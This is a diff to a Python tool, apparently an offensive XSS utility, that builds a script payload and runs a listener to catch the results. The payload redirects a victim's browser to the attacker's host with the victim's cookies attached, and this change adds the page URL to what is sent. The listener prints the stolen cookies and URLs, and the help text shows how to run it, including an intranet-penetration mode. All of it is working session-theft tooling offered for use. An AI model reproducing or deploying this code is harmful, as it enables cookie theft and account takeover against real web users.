@@ -23,9 +23,9 @@ class TCPINFO():
         self.transmission_mode=args.transmission_mode
     def run(self):
         if self.transmission_mode:
-            PAYLOAD = f"<script>document.write('<meta http-equiv=\"refresh\" content=\"0;url=http://{self.RHOSTS}:{str(self.RPORTS)}/1.html?cookie='+document.cookie+'\"');</script>"
+            PAYLOAD = f"<script>document.write('<meta http-equiv=\"refresh\" content=\"0;url=http://{self.RHOSTS}:{str(self.RPORTS)}/1.html?URL='+window.location.href+'&cookie='+document.cookie+'\"');</script>"
         else:
-            PAYLOAD = f"<script>document.write('<meta http-equiv=\"refresh\" content=\"0;url=http://{self.LHOST}:{str(self.LPORT)}/1.html?cookie='+document.cookie+'\"');</script>"
+            PAYLOAD = f"<script>document.write('<meta http-equiv=\"refresh\" content=\"0;url=http://{self.LHOST}:{str(self.LPORT)}/1.html?URL='+window.location.href+'&cookie='+document.cookie+'\"');</script>"
         self.Redirect_File()
         print('-'*100,"\n---|Payload[+]# PAYLOAD generated\n   |->",PAYLOAD,"\n",'-'*100)
         self.TCP_Listen()
@@ -37,10 +37,10 @@ class TCPINFO():
         TCP.listen(50)
         while True:
             SOCK, IP = TCP.accept()
-            client_thread = threading.Thread(
+            threading.Thread(
                 target=self.Client, args=(SOCK,IP)
-            )
-            client_thread.start()
+            ).start()
+
 
 
     def Client(self,SOCK,IP):
@@ -68,13 +68,24 @@ class TCPINFO():
 
     def Get_Cookie(self,DATA):
         DATA = DATA.decode().split("\r")[0]
-        DATA = re.search(r'cookie=(?P<COOKIE>.*?) HTTP',DATA)
-        print("Cookie==>\n"+DATA.group("COOKIE"))
+        try:
+            Path = re.search(r'URL=(?P<PATH>.*?)&cookie', DATA).group("PATH")
+        except:
+            pass
+        else:
+            print("Path:",Path)
+        try:
+            Cookie=re.search(r'cookie=(?P<COOKIE>.*?) HTTP',DATA).group("COOKIE")
+        except:
+            pass
+        else:
+            print("Cookie:",Cookie)
+
 
 
 def main():
     parser = argparse.ArgumentParser(
-        description='XSS Tool ---Martin v1.0',
+        description='XSS Tool ---Martin v1.2',
         formatter_class=argparse.RawTextHelpFormatter,
         epilog=textwrap.dedent('''
         Example:
@@ -83,7 +94,7 @@ def main():
            python3 %s # You can enable the default intranet port 5555 to listen without adding any parameters
            python3 %s -lp 1234  # You can add the - p parameter to specify the port
            python3 %s -t -lp 1234 -rh xxx.xxx.xxx.xxx -rp xxxx # You can join the IP and port penetrated by your intranet
-            '''% (sys.argv[0],sys.argv[0],sys.argv[0])))  # 创建解析对象
+            '''% (sys.argv[0],sys.argv[0],sys.argv[0])))  
     parser.add_argument('-lp', '--LPORT', type=int, default=5555, help='Listen port')
     parser.add_argument('-lh', '--LHOST', default=Get_LoackHost(), help='# Currently in the development stage, you don\'t need to carry this parameter')
     parser.add_argument('-t', '--transmission_mode', action='store_true', help='Intranet penetration mode')
